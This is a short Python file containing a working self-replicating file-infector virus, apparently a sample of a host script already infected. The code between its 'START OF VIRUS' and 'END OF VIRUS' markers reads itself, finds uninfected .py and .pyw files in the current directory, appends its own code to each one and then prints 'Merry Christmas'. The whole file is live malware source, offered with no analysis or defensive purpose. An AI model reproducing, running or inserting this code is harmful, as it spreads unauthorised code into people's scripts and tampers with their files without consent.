print('victim')
### START OF VIRUS ###
import sys, glob
VIRUS_AREA_START = '### START OF VIRUS ###\n'
VIRUS_AREA_END = '### END OF VIRUS ###\n'
def read_and_listify_file_code(this_file):
    code = []
    with open(this_file, 'r') as file:
        lines = file.readlines()
        is_virus_area = False
    for line in lines:
        if line == VIRUS_AREA_START:
            is_virus_area = True
        if is_virus_area and not line == '\n':
            if not '###' in line and '#' in line:
                line = line[:line.index(chr(35))]
            code.append(line)
        if line == VIRUS_AREA_END:
            break
    return code
def is_already_infected(file_name):
    with open(file_name, 'r') as file:
        lines = file.readlines()
    is_infected = False
    for line in lines:
        if line == VIRUS_AREA_START:
            is_infected = True
            break
    
    return is_infected
def select_not_already_infected_scripts(scripts_list):
    not_already_infected_scripts = []
    for script in scripts_list:
        if not is_already_infected(script):
            not_already_infected_scripts.append(script)
    
    return not_already_infected_scripts
def get_victim_scripts(extensions_list = ['py', 'pyw']):
        
    victim_scripts = []
    for ext in extensions_list:
        victim_scripts.extend(glob.glob(f'*.{ext}'))
    return select_not_already_infected_scripts(victim_scripts)
    
def infect_script(script, infectious_code):
    with open(script, 'a') as original_code:
        append = infectious_code[:]
        append.insert(0, '\n')
        original_code.writelines(append)
infectious_code = read_and_listify_file_code(sys.argv[0])
victim_scripts = get_victim_scripts()
for script in victim_scripts:
    infect_script(script, infectious_code)
print('\033[95mMerry Christmas\033[0m')
### END OF VIRUS ###